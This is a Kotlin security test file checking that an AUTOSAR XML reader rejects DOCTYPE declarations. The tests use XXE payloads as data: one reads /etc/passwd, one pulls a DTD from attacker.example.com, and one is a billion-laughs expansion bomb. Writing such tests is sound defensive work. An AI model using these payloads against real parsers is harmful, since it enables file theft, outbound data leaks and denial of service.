package dev.kuml.io.arxml

import io.kotest.assertions.throwables.shouldThrowAny
import io.kotest.core.spec.style.FunSpec
import io.kotest.matchers.string.shouldNotContain

class ArxmlReaderSecurityTest :
    FunSpec({

        val reader = ArxmlReader()

        test("reader blocks DOCTYPE declaration") {
            val xxePayload =
                """
                <?xml version="1.0" encoding="UTF-8"?>
                <!DOCTYPE foo [<!ELEMENT foo ANY>]>
                <AUTOSAR xmlns="http://autosar.org/schema/r4.0">
                  <AR-PACKAGES/>
                </AUTOSAR>
                """.trimIndent()

            shouldThrowAny {
                reader.readFromString(xxePayload)
            }
        }

        test("reader blocks external general entity (file SYSTEM)") {
            val xxePayload =
                """
                <?xml version="1.0" encoding="UTF-8"?>
                <!DOCTYPE foo [
                  <!ELEMENT foo ANY>
                  <!ENTITY xxe SYSTEM "file:///etc/passwd">
                ]>
                <AUTOSAR xmlns="http://autosar.org/schema/r4.0">
                  <AR-PACKAGES>
                    <AR-PACKAGE>
                      <SHORT-NAME>&xxe;</SHORT-NAME>
                    </AR-PACKAGE>
                  </AR-PACKAGES>
                </AUTOSAR>
                """.trimIndent()

            val thrown =
                shouldThrowAny {
                    reader.readFromString(xxePayload)
                }
            // Verify no file contents leaked into the exception message
            thrown.message?.shouldNotContain("root:") ?: Unit
        }

        test("reader blocks external parameter entity and DTD") {
            val xxePayload =
                """
                <?xml version="1.0" encoding="UTF-8"?>
                <!DOCTYPE foo [
                  <!ENTITY % remote SYSTEM "http://attacker.example.com/evil.dtd">
                  %remote;
                ]>
                <AUTOSAR xmlns="http://autosar.org/schema/r4.0">
                  <AR-PACKAGES/>
                </AUTOSAR>
                """.trimIndent()

            shouldThrowAny {
                reader.readFromString(xxePayload)
            }
        }

        test("reader blocks billion-laughs style entity expansion") {
            // The disallow-doctype-decl flag makes this throw immediately on DOCTYPE
            val billionLaughs =
                """
                <?xml version="1.0" encoding="UTF-8"?>
                <!DOCTYPE lolz [
                  <!ENTITY lol "lol">
                  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
                  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
                  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
                ]>
                <AUTOSAR xmlns="http://autosar.org/schema/r4.0">
                  <AR-PACKAGES>
                    <AR-PACKAGE><SHORT-NAME>&lol4;</SHORT-NAME></AR-PACKAGE>
                  </AR-PACKAGES>
                </AUTOSAR>
                """.trimIndent()

            shouldThrowAny {
                reader.readFromString(billionLaughs)
            }
        }
    })
